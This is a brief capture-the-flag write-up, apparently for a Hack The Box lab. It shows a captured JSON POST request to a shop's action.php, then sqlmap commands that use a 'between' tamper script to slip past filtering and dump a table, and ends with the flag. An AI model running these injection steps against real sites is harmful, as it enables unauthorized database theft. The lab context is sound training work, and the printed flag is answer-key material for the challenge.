## Challenge

What's the contents of table final_flag? 

## Solution

The page is an online shopping page.

After surfing on the page, I saw that most of the functions only lead to a form's action set to `#`, so nothing to do there.

But, on the shop, when I click on add to cart, I have a JS alarm saying `Item added`.

Let's check this on Burp.

```http
POST /action.php HTTP/1.1
Host: 94.237.59.180:43271
Content-Length: 8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://94.237.59.180:43271
Referer: http://94.237.59.180:43271/shop.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"id":1}
```

So here I see that it is JSON, and a `POST` request, which I will save to a file.

I tried with the following:

```sh
python3 sqlmap.py -r ../../final_case.txt -p id --dump
```

which didn't produce any results.

I added the tamper script between:

```sh
python3 sqlmap.py -r ../../final_case.txt -p id --tamper=between --dump
```

and it started giving me information, and I got the table name which is `final_flag` and the database name `production`

I added this information to the options of SQLMap:

```sh
python3 sqlmap.py -r ../../final_case.txt -p id --tamper=between --dump -T final_flag
```

And the result is:

```sh
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```


